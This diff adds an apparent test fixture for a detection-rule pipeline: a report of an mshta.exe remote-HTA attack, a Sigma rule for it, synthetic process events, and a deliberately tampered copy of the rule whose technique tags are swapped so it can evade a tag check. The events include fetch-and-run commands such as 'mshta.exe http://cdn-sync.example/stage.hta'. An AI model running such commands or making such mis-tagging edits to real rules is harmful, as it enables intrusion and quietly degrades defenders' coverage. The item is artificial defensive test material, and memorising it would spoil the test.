@@ -1,0 +1,127 @@
+id: D10-04
+role: defective
+defect_class: D10
+evasive: true
+why: The detection block is unchanged, but the technique tags are rewritten from T1218.005 (Mshta, stealth)
+  to T1059.001 (PowerShell, execution). T1059.001 is also cited by the report so a tag-validity check
+  can still pass, yet the rule is now mis-attributed in coverage and triage, and the content hash differs
+  from the approved one.
+expected_gate: approval-binding
+report_text: A malicious shortcut delivered by email caused the user's session to start a signed Windows
+  binary rather than a dropper. The operator launched mshta.exe with a remote HTA, either http://cdn-sync.example/stage.hta
+  or https://cdn-sync.example/stage.hta, which then started powershell.exe to download the next stage.
+  The HTA file contains script that spawns a hidden PowerShell process, so analysts tracked both the proxy
+  execution of the HTA and the PowerShell execution that followed. Defenders should expect the URL to
+  change between victims, but mshta.exe reaching out to a web address is the constant element in all observed
+  cases.
+evidence:
+- The operator launched mshta.exe with a remote HTA, either http://cdn-sync.example/stage.hta or https://cdn-sync.example/stage.hta,
+  which then started powershell.exe to download the next stage
+- mshta.exe reaching out to a web address is the constant element in all observed cases
+logsource: windows_process_creation
+techniques:
+- T1218.005
+- T1059.001
+sigma_yaml: |
+  title: Mshta Launching Remote HTA Content
+  id: c24f7a8b-1e63-4d95-a0b7-3f9e6c218d57
+  status: experimental
+  description: Detects mshta.exe started with an http or https URL on the command line to fetch and run a remote HTA payload.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.stealth
+    - attack.t1218.005
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\mshta.exe'
+      CommandLine|contains:
+        - 'http://'
+        - 'https://'
+    condition: selection
+  falsepositives:
+    - Legacy intranet applications that still load HTA pages from an internal web server
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\mshta.exe
+    cmd: mshta.exe http://cdn-sync.example/stage.hta
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\mshta.exe
+    cmd: mshta.exe https://cdn-sync.example/stage.hta
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\calc.exe
+    cmd: calc.exe
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\cmd.exe
+    cmd: cmd.exe /c dir C:\Users\bob
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\mshta.exe
+    cmd: mshta.exe C:\Program Files\CorpHelp\about.hta
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: |
+  title: Mshta Launching Remote HTA Content
+  id: c24f7a8b-1e63-4d95-a0b7-3f9e6c218d57
+  status: experimental
+  description: Detects mshta.exe started with an http or https URL on the command line to fetch and run a remote HTA payload.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.execution
+    - attack.t1059.001
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\mshta.exe'
+      CommandLine|contains:
+        - 'http://'
+        - 'https://'
+    condition: selection
+  falsepositives:
+    - Legacy intranet applications that still load HTA pages from an internal web server
+  level: high
+review: {}
+excluded: false
+exclusion_reason: ''
